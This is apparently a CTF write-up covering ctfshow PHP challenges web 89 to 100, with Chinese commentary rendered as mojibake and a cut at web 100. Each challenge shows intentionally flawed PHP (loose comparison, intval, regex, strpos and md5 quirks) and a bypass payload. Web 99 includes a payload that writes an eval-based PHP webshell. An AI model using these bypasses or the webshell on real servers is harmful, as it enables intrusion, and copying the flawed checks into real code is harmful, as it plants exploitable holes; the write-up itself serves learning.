        <content type="html"><![CDATA[<p>ï»¿ï»¿# web 89:æ•°ç»„ç»•è¿‡æ­£åˆ™</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[0-9]/&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">æ­£åˆ™è¡¨è¾¾å¼ä¸ä¼šåŒ¹é…æ•°ç»„</span><br><span class="line">intvalå¤„ç†æ•°ç»„æ—¶ï¼Œä¼šè¿”å›<span class="number">1</span>.</span><br><span class="line">payload: ?num[]=a</span><br></pre></td></tr></table></figure><h1 id="web-90-å¼±æ¯”è¾ƒ-intvalç‰¹æ€§"><a href="#web-90-å¼±æ¯”è¾ƒ-intvalç‰¹æ€§" class="headerlink" title="web 90:å¼±æ¯”è¾ƒ,intvalç‰¹æ€§"></a>web 90:å¼±æ¯”è¾ƒ,intvalç‰¹æ€§</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> intval(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">intvalé»˜è®¤è½¬æ¢ä¸º<span class="number">10</span>è¿›åˆ¶ã€‚æ­¤æ—¶é‡‡ç”¨<span class="number">8</span>è¿›åˆ¶ç»•è¿‡,<span class="number">16</span>è¿›åˆ¶ä¹Ÿè¡Œ</span><br><span class="line">payload:?num=<span class="number">010574</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web-91-æ­£åˆ™åŒ¹é…æ¨¡å¼"><a href="#web-91-æ­£åˆ™åŒ¹é…æ¨¡å¼" class="headerlink" title="web 91:æ­£åˆ™åŒ¹é…æ¨¡å¼"></a>web 91:æ­£åˆ™åŒ¹é…æ¨¡å¼</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^php$/im&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^php$/i&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;hacker&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;nonononono&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">ctfshow&#123;e10e724b-<span class="number">0</span>d62-<span class="number">4</span>a49-b648-<span class="number">613</span>c2267e369&#125;</span><br><span class="line"> </span><br><span class="line">åœ¨æ­£åˆ™è¡¨è¾¾å¼ä¸­ï¼Œå­˜åœ¨ä¸‰ä¸ªåŒ¹é…æ¨¡å¼ä¿®é¥°ç¬¦ <span class="string">&#x27;i&#x27;</span>ä¸åŒºåˆ†å¤§å°å†™,<span class="string">&#x27;m&#x27;</span>é‡‡ç”¨å¤šè¡ŒåŒ¹é…,<span class="string">&#x27;e&#x27;</span>å¯ç”¨ä¿®æ­£æ¨¡å¼</span><br><span class="line">é»˜è®¤æƒ…å†µä¸‹ï¼Œæ­£åˆ™è¡¨è¾¾å¼åªä¼šå°½åŠ›å»åŒ¹é…ç¬¬ä¸€è¡Œã€‚</span><br><span class="line">å› æ­¤é‡‡ç”¨ä¸€ä¸ª%<span class="number">0</span>aæ¢è¡Œç¬¦ç»•è¿‡</span><br><span class="line">payload:?cmd=%<span class="number">0</span>aphp</span><br></pre></td></tr></table></figure><h1 id="web-92-å¼±æ¯”è¾ƒ"><a href="#web-92-å¼±æ¯”è¾ƒ" class="headerlink" title="web 92:å¼±æ¯”è¾ƒ"></a>web 92:å¼±æ¯”è¾ƒ</h1> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> intval(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">åŒä¸Šï¼Œåˆ©ç”¨å…«è¿›åˆ¶ç»•è¿‡ã€‚</span><br><span class="line">payload:?num=<span class="number">010574</span></span><br></pre></td></tr></table></figure><h1 id="web-93"><a href="#web-93" class="headerlink" title="web 93:"></a>web 93:</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> intval(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line">ctfshow&#123;<span class="number">3410</span>df03-<span class="number">40</span>b0-<span class="number">4</span>d2c-be98-<span class="number">14</span>cf0bd34744&#125;</span><br><span class="line">åŒä¸Šï¼Œåˆ©ç”¨å…«è¿›åˆ¶ç»•è¿‡ã€‚</span><br><span class="line">æœ¬é¢˜ä¸èƒ½é‡‡ç”¨<span class="number">16</span>è¿›åˆ¶ç»•è¿‡ï¼Œå› ä¸ºåšäº†å­—æ¯è¿‡æ»¤ã€‚</span><br><span class="line">payload:?num=<span class="number">010574</span></span><br></pre></td></tr></table></figure><h1 id="web-94-strposç»•è¿‡"><a href="#web-94-strposç»•è¿‡" class="headerlink" title="web 94:strposç»•è¿‡"></a>web 94:strposç»•è¿‡</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!strpos(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">strposä¼šè¿”å›ç¬¬ä¸€æ¬¡å‡ºç°ç›®æ ‡å­—ç¬¦ä¸²çš„ä½ç½®ã€‚</span><br><span class="line">å¦‚æœæˆ‘ä»¬æŒ‰ä¸Šé¢çš„ä»¥<span class="number">0</span>å¼€å¤´ï¼Œé‚£ä¹ˆè¿™ä¸ª<span class="keyword">if</span>ç»•ä¸è¿‡ã€‚</span><br><span class="line">å› æ­¤é‡‡ç”¨ä¸€ä¸ªç©ºæ ¼æˆ–è€…+å·ç»•è¿‡</span><br><span class="line">payload:+<span class="number">010574</span></span><br></pre></td></tr></table></figure><h1 id="web-95"><a href="#web-95" class="headerlink" title="web 95:"></a>web 95:</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!strpos(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">strposä¼šè¿”å›ç¬¬ä¸€æ¬¡å‡ºç°ç›®æ ‡å­—ç¬¦ä¸²çš„ä½ç½®ã€‚</span><br><span class="line">æˆ‘å¼€é”™é¢˜äº†ï¼Ÿ</span><br><span class="line">ä¸ºä»€ä¹ˆä¸èƒ½ä½¿ç”¨%<span class="number">0</span>aã€‚</span><br><span class="line">å› ä¸º%<span class="number">0</span>aæ˜¯åŒ¹é…é¦–å°¾ï¼Œæœ¬é¢˜æœªé‡‡ç”¨é¦–å°¾æ¨¡å¼ã€‚</span><br><span class="line">payload:+<span class="number">010574</span></span><br></pre></td></tr></table></figure><h1 id="web-96-è·¯å¾„ç›¸å…³"><a href="#web-96-è·¯å¾„ç›¸å…³" class="headerlink" title="web 96:è·¯å¾„ç›¸å…³"></a>web 96:è·¯å¾„ç›¸å…³</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]==<span class="string">&#x27;flag.php&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">ç›¸å¯¹è·¯å¾„ï¼š./è¡¨ç¤ºæœ¬ç›®å½•ä¸‹</span><br><span class="line">ç»å¯¹è·¯å¾„ï¼š/<span class="keyword">var</span>/www/html/flag.php</span><br><span class="line">payload:u=./flag.php</span><br></pre></td></tr></table></figure><h1 id="web-97-MD5æ— æ³•å¤„ç†æ•°ç»„"><a href="#web-97-MD5æ— æ³•å¤„ç†æ•°ç»„" class="headerlink" title="web 97:MD5æ— æ³•å¤„ç†æ•°ç»„"></a>web 97:MD5æ— æ³•å¤„ç†æ•°ç»„</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])</span><br><span class="line"><span class="keyword">if</span> (md5(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === md5(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">å¼±æ¯”è¾ƒ+MD5</span><br><span class="line">MD5æ— æ³•å¤„ç†æ•°ç»„ï¼Œå†å¯¹æ•°ç»„å¤„ç†æ—¶ä¼šè¿”å›<span class="literal">NULL</span>ã€‚</span><br><span class="line">payload:a[]=<span class="number">1</span>&amp;b[]=<span class="number">2</span></span><br></pre></td></tr></table></figure><h1 id="web-98-ä¸‰ç›®è¿ç®—ç¬¦-å˜é‡è¦†ç›–"><a href="#web-98-ä¸‰ç›®è¿ç®—ç¬¦-å˜é‡è¦†ç›–" class="headerlink" title="web 98:ä¸‰ç›®è¿ç®—ç¬¦+å˜é‡è¦†ç›–"></a>web 98:ä¸‰ç›®è¿ç®—ç¬¦+å˜é‡è¦†ç›–</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$_GET</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_POST</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_COOKIE</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_SERVER</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line">highlight_file(<span class="variable">$_GET</span>[<span class="string">&#x27;HTTP_FLAG&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$flag</span>:<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">ä¸‰ç›®è¿ç®—ç¬¦ï¼š åˆ¤æ–­å¥ï¼Ÿæ¡ä»¶çœŸæ—¶ï¼šæ¡ä»¶å‡æ—¶</span><br><span class="line">å˜é‡è¦†ç›–ï¼š&amp;åŠ¨æ€è·Ÿè¸ªå˜é‡ï¼Œä¼šæ ¹æ®å˜é‡çš„å˜åŒ–è€Œå˜åŒ–ã€‚</span><br><span class="line"> </span><br><span class="line">æ ¹æ®é¢˜ç›®å½“ä»¥GETä¼ å…¥å‚æ•°æ—¶ï¼Œé‚£ä¹ˆGETçš„å‚æ•°å°±ä¼šæ’ç­‰äºPOSTé‡Œä¼ çš„å‚æ•°</span><br><span class="line">å†æ ¹æ®æœ€åä¸€ä¸ªè¯­å¥ï¼Œè¦GETä¼ å…¥çš„HTTP_FLAGã€‚</span><br><span class="line">æ ¹æ®å˜é‡è¦†ç›–ï¼Œæˆ‘ä»¬é‡‡ç”¨POSTä¼ å‚æ‰èƒ½ä¼ åˆ°GETä¸­å»ã€‚</span><br><span class="line">ä½†å‰ææ˜¯è¦æœ‰GETä¼ ä¸€æ¬¡å‚ï¼Œé‚£ä¹ˆéšä¾¿ä¼ ä¸€ä¸ªæ•°è¿›å»ã€‚</span><br><span class="line">payload:</span><br><span class="line">       GET:?a=b</span><br><span class="line">       POST:HTTP_FLAG=flag</span><br></pre></td></tr></table></figure><h1 id="web-99-in-arrayå‡½æ•°æ¼æ´"><a href="#web-99-in-arrayå‡½æ•°æ¼æ´" class="headerlink" title="web 99:in_arrayå‡½æ•°æ¼æ´"></a>web 99:in_arrayå‡½æ•°æ¼æ´</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$allow</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">36</span>; <span class="variable">$i</span> &lt; <span class="number">0x36d</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">    array_push(<span class="variable">$allow</span>, rand(<span class="number">1</span>,<span class="variable">$i</span>));  <span class="comment">//æ·»åŠ å…ƒç´ </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>]) &amp;&amp; in_array(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$allow</span>))&#123;</span><br><span class="line">    file_put_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);  <span class="comment">//å†™é©¬</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">in_array:æœ‰ä¸‰ä¸ªå‚æ•°ï¼Œå½“ç¬¬ä¸‰ä¸ªå‚æ•°ä¸ºç©ºæ—¶ã€‚åˆ™å­˜åœ¨ç±»ä¼¼å¼±æ¯”è¾ƒçš„è½¬æ¢å¦‚<span class="number">123</span>abcè½¬æ¢ä¸º<span class="number">123</span></span><br><span class="line">æœ¬é¢˜å› ä¸ºç¡®å®æ˜¯éšæœºå†™å…¥çš„ã€‚å› æ­¤å¤šè¯•å‡ æ¬¡å¯èƒ½å°±<span class="number">1</span>.phpå†™é©¬ã€‚</span><br><span class="line">payload:</span><br><span class="line">             GET:?n=<span class="number">1</span>.php</span><br><span class="line">             POST:content=<span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="web-100-andç‰¹æ€§ï¼Œshellæ‹¼æ¥"><a href="#web-100-andç‰¹æ€§ï¼Œshellæ‹¼æ¥" class="headerlink" title="web 100:andç‰¹æ€§ï¼Œshellæ‹¼æ¥"></a>web 100:andç‰¹æ€§ï¼Œshellæ‹¼æ¥</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;ctfshow.php&quot;</span>);</span><br><span class="line"><span class="comment">//flag in class ctfshow;</span></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="keyword">new</span> ctfshow();</span><br><span class="line"><span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v0</span>=is_numeric(<span class="variable">$v1</span>) <span class="keyword">and</span> is_numeric(<span class="variable">$v2</span>) <span class="keyword">and</span> is_numeric(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v0</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;/&quot;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/\;/&quot;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span 